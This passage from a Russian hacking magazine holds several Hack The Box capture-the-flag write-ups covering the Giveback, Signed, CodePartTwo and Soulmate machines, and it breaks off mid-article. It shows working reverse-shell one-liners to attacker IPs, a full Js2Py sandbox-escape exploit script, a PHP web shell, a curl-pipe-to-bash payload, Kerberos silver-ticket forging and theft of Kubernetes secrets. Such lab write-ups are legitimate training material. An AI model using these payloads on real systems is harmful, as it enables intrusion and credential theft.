Потоки бывают трех типов: Passive, Active и Convert. В окне Workflows вверху
есть соответствующие табы для переключения. Пассивные потоки работают
в фоне и не требуют каких‑то действий от пользователей. Конвертирующие
принимают на вход байты запросов, которые обрабатывают в соответствии
с правилами потока. На выходе будет модифицированный запрос. Активные
потоки запускаются пользователем из контекстного меню.





                        Воркфлоу Base64 Encode

Caido — мощный инструмент, который поначалу кажется непривычным. Ско‐
рее всего, потребуется время, чтобы подстроиться под интерфейс и логику
автоматизации программы. Ограничения бесплатных тарифов делают работу
не такой комфортной, но, думаю, ты быстро адаптируешься и проникнешься
этой тулзой. © X
HACK THE BOX





Сегодня мы  проникнем  во  внутреннюю
инфраструктуру Kubernetes и захватим весь
кластер. Наблюдая за прохождением, ты
увидишь,  как одна  веб‑уязвимость  при‐                                                                                         RalfHacker
                                                                                          @RalfHackerChannelводит  к компрометации Kubernetes-окру‐
жения  и  получению  root-доступа  через
механизмы контейнеризации.


Наша цель — получение прав суперпользователя на машине Giveback с учеб‐
ной площадки Hack The Box . Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.129.10.165    giveback.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Nginx 1.28.0.

Как показывает результат сканирования порта 80, на веб‑сервере развернут
WordPress 6.8.1.





                           Главная страница сайта


ТОЧКА ВХОДА

При тестировании сайтов на WordPress лучше всего использовать утилиту
WPScan . С ее помощью  можно  обнаружить  уязвимые  версии самого
WordPress, тем и плагинов, а также собрать пользователей и перебрать учет‐
ные  данные. Перед началом  сканирования  можно  зарегистрироваться
на официальном сайте WPScan и получить API-токен (это бесплатно).
   Чаще  всего  уязвимости  прячутся в  плагинах, поэтому я запустил их
перебор (опция -e vp ), используя 128 потоков (опция -t ).


wpscan --api-token KEDNckD8h7Ahn3WzqoSaxy1xa6RuLmx0nCl97cO83Dw --url
http://giveback.htb/ -e vp -t 128





                         Обнаруженные плагины

Через несколько минут получаем отчет с 22 уязвимостями в плагине Donation
Plugin and Fundraising Platform. Меня привлекла CVE-2024-5932 , а по ссылкам
на WPScan можно найти подробную информацию об этих уязвимостях.





                       Информация об уязвимости


ТОЧКА ОПОРЫ

В WordPress установлен плагин Donation Plugin and Fundraising Platform с уяз‐
вимой версией, позволяющей внедрить PHP-объект через десериализацию.
При переходе на страницу Donation Station видим ссылку на страницу этого
плагина.





                        Страница Donation Station





                            Страница плагина

Для найденной CVE уже есть автоматизированный эксплоит . Запустим лис‐
тенер pwncat-cs  -lp  4321 и проэксплуатируем уязвимость. В качестве
команды на удаленном хосте выполним обычный реверс‑шелл.


python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-
things-we-need -c "bash -c 'bash -i >& /dev/tcp/10.10.15.197/4321 0>&
1'"





                               Запуск эксплоита





                         Сессия пользователя root


ПРОДВИЖЕНИЕ

Теперь нужно собрать информацию. Я буду использовать для этого скрипты
PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим ему право на выпол‐
нение и запустим сканирование. Затем посмотрим, что интересного наш‐
лось.
  В переменных окружения есть адреса и учетные данные для разных сер‐
висов из подсети 10.43.0.0/16.





                         Переменные окружения

Среди смонтированных ресурсов есть файлы K3s — легковесный, упрощен‐
ный Kubernetes.





                         Монтированные ресурсы

Чтобы проверить найденные сервисы, поднимем SOCKS5-туннель во внут‐
реннюю сеть. Для этого я буду использовать агент Gopher из AdaptixC2 .




                              Сессия Gopher

По адресу 10.43.2.241:5000 стоит CMS со ссылками на разные внутренние
ресурсы. Из доступных эндпоинтов — только /phpinfo.php и /cgi-bin .





                           Главная страница сайта

Ищем готовые эксплоиты для найденных эндпоинтов. Отправляемся за ними
в Google и находим CVE-2024-4577 в PHP-CGI.





                        Поиск уязвимостей в Google

Модуль PHP-CGI может ошибочно интерпретировать определенные символы
как опции PHP и передавать их в запускаемый PHP‑скрипт. Это позволяет
выполнить произвольный код. Для проверки уязвимости используем авто‐
матизированный эксплоит . Перед эксплуатацией запустим листенер ( rlwrap
nc -nlvp 4321 ).


proxychains -q python3 watchTowr-vs-php_cve-2024-4577.py -c "busybox
nc 10.10.15.197 4321 -e /bin/sh" -t http://10.43.2.241:5000/cgi-bin/
php-cgi





                           Выполнение эксплоита




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИHACK THE BOX
       HTB GIVEBACK
          РАЗБИРАЕМ АТАКУ НА КЛАСТЕР
                    С KUBERNETES





                         Сессия пользователя root


K8s
Заливаем агент Gopher на новую скомпрометированную машину и получаем
удобную сессию.





                        Сессии агентов AdaptixC2

Теперь нужно повторить сбор информации на новой машине. Снова загружа‐
ем LinPEAS, даем права на исполнение и запускаем через Remote Terminal.





                               Загрузка LinPEAS

В переменных окружения находим данные сервера Kubernetes.





                         Переменные окружения

Теперь получим с машины токен и сертификат для работы с Kubernetes. Их
можно     найти    в     каталоге    /var/run/secrets/kubernetes.io/
serviceaccount — там лежат секреты ServiceAccount для подов, чтобы кон‐
тейнеры могли аутентифицироваться в API-сервере кластера.





                   Содержимое каталога serviceaccount





                     Содержимое файлов Kubernetes

С полученным токеном выполним  запрос  к  API /api/v1/namespaces/{
namespace}/secrets , чтобы получить секреты из namespace, в нашем слу‐
чае — default .


TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/
v1/namespaces/default/secrets





                             Секреты в default

Под секретами в Kubernetes понимаются объекты с чувствительными дан‐
ными — паролями, токенами и ключами. Например, в user-secret-babywyrm
есть MASTERPASS в формате Base64.





                             Секреты в default




                   Декодированное значение MASTERPASS

С этим паролем  подключаемся по SSH под  пользователем babywyrm
и забираем первый флаг.




                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Одно из первых мест, куда стоит заглянуть при повышении привилегий, —
настройки sudoers. Узнать их можно командой sudo -l .




                               Настройки sudoers

Мы можем запустить файл /opt/debug от имени пользователя root. Пробный
запуск показал, что нужен какой‑то внутренний административный пароль.





                            Вывод /opt/debug

Вернемся к списку секретов Kubernetes и поищем другие пароли, которые
могут подойти и сюда, — например, для базы данных MariaDB.





                     Секреты для базы данных MariaDB



                          Декодированный пароль

Пробуем применить этот пароль к /opt/debug , и нас пропускают дальше.





                            Вывод /opt/debug

После получения справки становится понятно, что /opt/debug — это обертка
вокруг runc , инструмента для создания и запуска контейнеров.


sudo /opt/debug --help





                               Справка help

Мы можем запустить привилегированный контейнер, дать ему доступ к фай‐
ловой системе хоста и создать SUID‑файл, который выдаст командную обо‐
лочку с правами root.
   Сначала подготовим конфиг для контейнера — проще всего изменить
базовый конфиг. Сгенерируем его командой sudo /opt/debug spec . Затем
создадим каталог root/rootfs и в каталог root поместим измененный
config.json .


{
  "ociVersion": "1.2.1",
  "process": {
    "terminal": false,
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/sh", "-c", "cp /bin/bash /tmp/lpebash && chmod
4755 /tmp/lpebash"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/
sbin:/bin"]
  },
  "root": {"path": "rootfs", "readonly": false},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin",
"options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib",
"options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64",
"options": ["bind","ro"]},
    {"destination": "/tmp", "type": "bind", "source": "/tmp",
"options": ["bind","rw"]}
  ],
  "linux": {"namespaces": [{"type": "mount"}]}
}

В конфиге монтируются ключевые каталоги хоста, а /bin/bash копируется в /
tmp/lpebash с установленным битом SUID. Фишка в том, что ядро Linux
не различает привилегированный контейнер и хостовую систему в bind-
mounts. Бит SUID сохраняется при копировании через общий /tmp. Когда все
готово, создаем контейнер.


sudo /opt/debug run lpe





                          Создание контейнера

Когда у файла есть атрибут suid, обычный пользователь, запускающий этот
файл на исполнение, получает повышение прав до пользователя — владель‐
ца файла в рамках запущенного процесса. В нашем случае /tmp/lpebash
будет выполняться от имени пользователя root.





                           Флаг рута

Машина захвачена! © X
HACK THE BOX





Сегодня вся лаба посвящена пентесту сер‐
вера Microsoft SQL. Проведем  разведку,
затем шаг за шагом продвинемся к компро‐
метации   доменной    учетной   записи.                                                                                         RalfHacker
                                                                                          @RalfHackerChannelПо  дороге  разберем  перехват  NTLM-
хешей,  генерацию  Kerberos  silver  ticket
и нестандартное использование серверных
привилегий SQL  Server  для  локального
повышения прав вплоть до полного захвата
системы.


Наша цель — получить права суперпользователя на машине Signed с учебной
площадки Hack The Box . Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам HTB лучше через ано‐
                        нимайзеры  и  в  виртуалке.  Не  делай  этого
                        с компьютеров, где хранятся важные для тебя
                          данные: ты окажешься в общей сети с другими
                            участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts .


10.10.11.90    signed.htb

На этот раз, помимо IP-адреса машины, нам дают и учетные данные к службе
MSSQL с правами пользователя домена.





                         Информация о машине

Запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг любой атаки. Оно позволя‐
ет  атакующему  узнать, какие службы на  хосте  принимают соединения.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Самый  известный  инструмент для  сканирования — Nmap.  Улучшить
результаты его работы ты можешь с помощью следующего скрипта.


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он работает в два этапа. Сначала запускается обычное быстрое сканиро‐
вание, затем — более тщательное, с использованием имеющихся скриптов
(опция -A ).
   Подробнее о работе с Nmap читай в статье « Nmap с самого начала. Осва‐
иваем разведку и сканирование сети ».





                             Результат работы скрипта

При сканировании мы нашли всего один открытый порт — 1433. На нем кру‐
тится служба управления базами данных Microsoft SQL Server 2022.


ТОЧКА ВХОДА

Проверим выданные нам учетные данные на MSSQL с помощью NetExec .


nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --local-auth



                        Результат проверки учетных данных

Подключаемся с помощью скрипта mssqlclient.py из набора Impacket
и пробуем включить процедуру xp_cmdshell , чтобы выполнять системные
команды через шелл.


mssqlclient.py scott:'Sm230#C5NatH'@10.10.11.90


enable_xp_cmdshell





                          Результат выполнения команды

Прав на использование этой процедуры у учетной записи нет, поэтому про‐
верим существующие учетные записи MSSQL, наличие связанных серверов
и возможность олицетворять другие учетные записи.


enum_logins
enum_links
enum_impersonate





                        Проверка конфигураций MSSQL

Пока зацепиться не за что, поэтому попробуем запустить Responder и обра‐
титься к службе SMB на своем хосте с помощью процедуры xp_dirtree . Так
мы получим NTLMv2-хеш учетной записи mssqlsvc .


xp_dirtree \\10.10.15.73\a sd





                          Результат выполнения команды


sudo python3 Responder.py -I tun0





                   Хеш пароля пользователя

Мы  получили  хеш  пароля  пользователя.  Попробуем  перебрать  его
с  помощью   Hashcat ,    указав   параметр   mode  —   тип   хеша.
Для NetNTLMv2 это число 5600.


hashcat -a 0 -m 5600 hash.txt rockyou.txt





                          Подобранный пароль

От имени скомпрометированной учетной записи авторизуемся в службе
MSSQL и снова проверяем права на использование процедуры xp_cmdshell .


mssqlclient.py signed.htb/mssqlsvc:'purPLE9795!@'@10.10.11.90
-windows-auth


enable_xp_cmdshell





                          Результат выполнения команды

Но и сейчас прав на включение xp_cmdshell нет.


ПРОДВИЖЕНИЕ

Посмотрим, от имени каких пользователей базы данных мы можем работать.
Однако это ни к чему не ведет.


enum_impersonate




                Список учетных записей для олицетворения

Теперь получим список логинов. Наша задача — найти учетные записи и груп‐
пы с административными правами в базе.


enum_logins





                              Список логинов

Группа IT имеет права локального администратора. У нас есть пароль учетной
записи, от имени которой работает сервис MSSQL, значит, мы можем сге‐
нерировать  серебряный  билет  Kerberos. Это  позволит  авторизоваться
как член этой группы и запустить процедуру xp_cmdshell .
  Для создания тикета Kerberos нужно узнать SID’ы учетной записи сервиса
и целевой группы. Их можно запросить из базы данных.


SELECT SUSER_SID('SIGNED\IT');





                             SID группы IT


SELECT SUSER_SID('SIGNED\mssqlsvc');





                      SID учетной записи mssqlsvc

Теперь преобразуем SID из бинарного формата в классический вид. Нап‐
ример, вот как это можно сделать на Python.


import struct
sid = bytes.fromhex('
0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000')
print('S-{}-{}'.format(sid[0], int.from_bytes(sid[2:8], 'big')) + ''.
join(['-' + str(struct.unpack('<I', sid[8+i*4:12+i*4])[0]) for i in
range(sid[1])]))


sid = bytes.fromhex('
0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000')
print('S-{}-{}'.format(sid[0], int.from_bytes(sid[2:8], 'big')) + ''.
join(['-' + str(struct.unpack('<I', sid[8+i*4:12+i*4])[0]) for i in
range(sid[1])])





                            Преобразование SID

Последним делом посчитаем из пароля NT-хеш. Для этого можно исполь‐
зовать утилиту pypykatz .


pypykatz crypto nt 'purPLE9795!@'



                         NT-хеш пароля

Когда все данные собраны, генерируем TGS-билет для службы MSSQL.
В этом поможет скрипт ticketer из Impacket.


ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-
5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn
MSSQLSvc/DC01.SIGNED.HTB:1433 -groups 1105 -user-id 1103 mssqlsvc





                            Создание билета

Так как Kerberos работает только с именем хоста, обновим запись в файле /
etc/hosts .


10.10.11.90 signed.htb dc01.signed.htb

С созданным билетом авторизуемся в сервисе и активируем процедуру
xp_cmdshell .


KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -k -no-pass dc01.signed.htb


enable_xp_cmdshell





                      Активация процедуры xp_cmdshell





                      Результат выполнения команды whoami

Теперь мы можем получить сессию с помощью агента любого фреймворка.





                      Информация о текущей сессии

На рабочем столе пользователя забираем первый флаг.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Была идея запустить новый процесс с полным токеном пользователя сервиса
mssqlsvc и воспользоваться привилегией SeImpersonate для повышения
прав, но это так и не удалось сделать.





                         Попытка запуска нового агента

Создадим серебряный билет с группами администраторов домена и пред‐
приятия и подключимся к базе данных.


ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-
5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn
MSSQLSvc/DC01.SIGNED.HTB:1433 -groups 1105 -user-id 1103 mssqlsvc





                            Создание тикета

После авторизации проверим привилегии нашего логина на этом сервере.


SELECT * FROM fn_my_permissions(NULL, 'SERVER');





                             Проверка привилегий

Право ADMINISTER BULK OPERATIONS в SQL Server — это серверное раз‐
решение, которое позволяет выполнять операции загрузки и выгрузки дан‐
ных.  Попробуем  с помощью OPENROWSET(BULK...)  прочитать  историю
PowerShell из профиля Administrator.


SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\AppData\R
oaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.
txt', SINGLE_CLOB) AS Contents





                Содержимое файла ConsoleHost_history.txt

В файле находим пароль администратора — это позволяет запустить новую
сессию с повышенными привилегиями.


execute-assembly RunasCs.exe Administrator Th1s889Rabb!t C:\Windows\
Tasks\a.exe -d signed.htb





                           Флаг рута

Машина захвачена! © X
HACK THE BOX





Сегодня я покажу, как при атаке на машину
с  Linux  злоумышленник может повысить
привилегии  через   службу   резервного
копирования, которой разрешено  запус‐                                                                                         RalfHacker
                                                                                          @RalfHackerChannelкаться от рута. Но прежде чем добраться
до   сервера,  нам   понадобится   выйти
из песочницы Js2Py на сайте, получить воз‐
можность удаленного выполнения команд
и изменить контекст безопасности.


Наша цель — получить права суперпользователя на машине CodePartTwo
с учебной площадки Hack The Box . Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.82    codeparttwo.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 8000 — веб‑сервер Gunicorn 20.0.4.

Перейдем на порт 8000 и осмотримся на сайте. Там можно зарегистри‐
роваться и войти, а еще есть ссылка на исходный код приложения.





                           Главная страница сайта


ТОЧКА ВХОДА

Открываем проект с исходным кодом в любом удобном редакторе и в файле
app.py находим секрет Flask.





                        Содержимое файла app.py

В файле requirements.txt указаны зависимости проекта. Здесь исполь‐
зуются точные версии, поэтому нужно проверить, нет ли для них известных
уязвимостей.





                   Содержимое файла requirements.txt

Проще всего загуглить их.





                         Поиск эксплоитов в Google

Так мы находим уязвимость в Js2Py.


ТОЧКА ОПОРЫ

Как следует из описания CVE-2024-28397, Js2Py до версии 0.74 позволяет
выполнять произвольный код с помощью  специально сформированного
вызова API. Код для выполнения команды в командной оболочке можно взять
из PoC на GitHub .


let cmd = "<COMMAND_HERE>"
let hacked, bymarve, n11
let getattr, obj


hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__


function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen
") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}


n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).
communicate()
console.log(n11)
n11





                     PoC для уязвимости

В исходном коде приложения находим вызов API js2py.eval() , который
выполняет код из POST-параметра code на эндпоинте /run_code .





                        Содержимое файла app.py

Запускаем листенер pwncat-cs -lp 4321 и отправляем код для создания
реверс‑шелла.

Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, который запустил шелл. Для приема соеди‐
нения необходимо создать на локальной машине listener, то есть «слушатель».


Можно использовать такой вариант:


import requests


payload = """
// [+] command goes here:
let cmd = "bash -c 'bash -i >&/dev/tcp/10.10.14.221/4321 0>&1'"
let hacked, bymarve, n11
let getattr, obj


hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__


function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen
") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}


n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).
communicate()
console.log(n11)
n11
"""


def send_request():
    url = "http://10.10.11.82:8000/run_code"
    headers = {"Content-Type": "application/json"}
    data = {"code": f"{payload}"}


    try:
        response = requests.post(url, json=data, headers=headers)
    except Exception as e:
        pass


send_request()





                         Сессия пользователя app


ПРОДВИЖЕНИЕ

Мы получили сессию пользователя. Чтобы изменить контекст работы, нужно
поискать учетные данные. На хосте развернут веб‑сервер и веб‑приложение,
поэтому первым делом попробуем достать какие‑нибудь учетные данные
пользователей. Есть высокая вероятность, что они подойдут и для локальных
учетных записей. Осмотримся в каталоге приложения. Находим файл users.
db .





                      Содержимое каталога instance

Чтобы скачать файл с удаленного сервера с помощью pwncat-cs , сначала
комбинацией Ctrl-D выходим в главное меню программы, затем используем
команду download [file] для переноса файла и командой back возвра‐
щаемся обратно в сессию с командной оболочкой.





                       Скачивание файла базы данных

Открываем файл базы данных в DB Browser for SQLite и находим таблицу
user с четырьмя парами учетных данных.





                        Содержимое базы данных

Отправляем хеши на поиск в онлайновой базе CrackStation и из четырех
хешей получаем три пароля.





                            Результат подбора паролей

Пользователь marco уже есть в системе, поэтому пробуем авторизоваться
по SSH с его паролем и после входа в сессию получаем первый флаг.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Теперь нам нужно собрать информацию. Я буду использовать для этого
скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на удаленный хост скрипт для Linux, дадим право на выполнение
и запустим сканирование. В выводе будет много всего, наша задача — найти
вещи, которые помогут повысить привилегии в системе.
   Судя по настройкам sudoers  ( sudo  -l ), мы можем без ввода пароля
выполнить команду /usr/local/bin/npbackup-cli в привилегированном
контексте.





                               Настройки sudoers

Причем файл /usr/local/bin/npbackup-cli был добавлен пользователем.





                    Файлы, добавленные пользователем

Если проверим тип файла, увидим, что это скрипт на Python, просто запус‐
кающий Network Backup Client.



                          Информация о файле





                     Содержимое файла npbackup-cli





                               Справка help

Утилите можно указать файл с настройками. Пример уже есть в рабочем
каталоге    пользователя.   В   поля    конфига   pre_exec_commands
и post_exec_commands , скорее всего, нужно вписать команды, выполняемые
перед созданием резервной копии или после него.





                    Содержимое файла конфигураций

Скопируем этот файл и добавим в pre_exec_commands команду chmod u+s /
bin/bash . Потом запустим создание резервной копии.


sudo /usr/local/bin/npbackup-cli -c lpe.comf -f -b





                          Результат выполнения команды

Теперь проверяем атрибуты файла /bin/bash и видим выставленный S-бит.



                              Атрибуты файла


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.





                           Флаг рута

Мы можем выполнять команды от имени рута, а значит, машина захвачена! © X
HACK THE BOX





В этом райтапе мы разберем компромета‐
цию CrushFTP через последнюю CVE-уяз‐
вимость. Получим возможность  удаленно
выполнять команды, закрепимся в системе                                                                                         RalfHacker
                                                                                          @RalfHackerChannelи найдем службу, работающую с правами
root. Используя интерактивную Erlang-обо‐
лочку, выполним системные команды и зах‐
ватим полный контроль над машиной.


Наша цель — получение прав суперпользователя на машине Soulmate с учеб‐
ной площадки Hack The Box . Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.86    soulmate.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Nginx 1.18.0.

На веб‑сервере нас встречает сайт с формой авторизации.





                           Главная страница сайта


ТОЧКА ВХОДА

Первым делом просканируем сайт на наличие интересных каталогов и фай‐
лов.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch , DIRB или  ffuf . Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -d — глубина сканирования;
 • -t — количество потоков;
 • -w — словарь (я использую словари из набора SecLists ).



Задаем все параметры и запускаем сканирование:


feroxbuster -u http://soulmate.htb/ -d 1 -t 128 -w php_files_common_
5476.txt





             Результат сканирования файлов с помощью feroxbuster

Ничего  интересного  не  находим,  поэтому  просканируем  поддомены
с помощью ffuf . Для этого при запуске используем следующие параметры:
 • -u — URL-адрес;
 • -H — HTTP-заголовок;
 • -w — словарь;
 •  -t — количество потоков.


ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.soulmate.htb' -w
subdomains-dnsscan-10000.txt -t 128





                       Результат сканирования поддоменов

В вывод попадают все варианты из списка, поэтому есть смысл использовать
фильтр по размеру ответа (параметр -fs).


ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.soulmate.htb' -w
subdomains-dnsscan-10000.txt -t 128 -fs 154



                       Результат сканирования поддоменов

Мы нашли новый поддомен, обновляем запись в /etc/hosts и смотрим сайт
в браузере.


10.10.11.86 soulmate.htb ftp.soulmate.htb





                           Главная страница сайта

На сайте нас встречает страница авторизации CrushFTP. Для начала про‐
верим, есть ли для этой системы готовые эксплоиты. Отправляемся за ними
в Google.





                         Поиск эксплоитов в Google

И узнаём, что CrushFTP версии до 11.3.1 содержит уязвимость CVE-2025-
31161, которая позволяет обойти аутентификацию и выполнить произвольные
действия от имени учетной записи crushadmin, включая создание своего
пользователя‑администратора (как описано в ресерче ). Воспользуемся экс‐
плоитом, который сделает все это автоматически.


python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80
--target_user ralf --new_user ralf --password ralf





                          Результат выполнения команды

В итоге создастся учетная запись администратора сервиса.





              Главная страница авторизованного пользователя


ТОЧКА ОПОРЫ

Проверим, доступна ли нам панель администратора. Для этого переходим
в меню Admin .





                          Панель администратора

Доступ есть, значит, переходим к странице управления пользователями User
Manager и изучаем учетные записи приложения. У учетной записи ben есть
доступ к загрузке файлов в каталог веб‑приложения. Это позволит нам заг‐
рузить, а затем выполнить веб‑шелл. Чтобы авторизоваться как ben, зададим
ему свой пароль.





                  Страница управления пользователями

Авторизуемся как ben и переходим к каталогу webProd .





                           Доступные каталоги

Выбираем загрузку файлов и сохраняем самый простой веб‑шелл:


<?php system($_GET["cmd"]); ?>





                                Загрузка файла

Затем через загруженный шелл выполним команду id .





                          Результат выполнения команды

Шелл работает, а значит, можно получить стабильную сессию в листенер
( pwncat-cs -lp 4321 ). Для этого поднимем свой веб‑сервер ( python3 -m
http.server) и добавим такой реверс‑шелл:


/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.56/4321 0>&1'

Загрузим его и выполним через curl .


http://soulmate.htb/shell.php?cmd=curl%20http://10.10.14.56:8000/
rs%20|%20bash




                               Логи веб‑сервера





                       Флаг пользователя


ПРОДВИЖЕНИЕ

Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
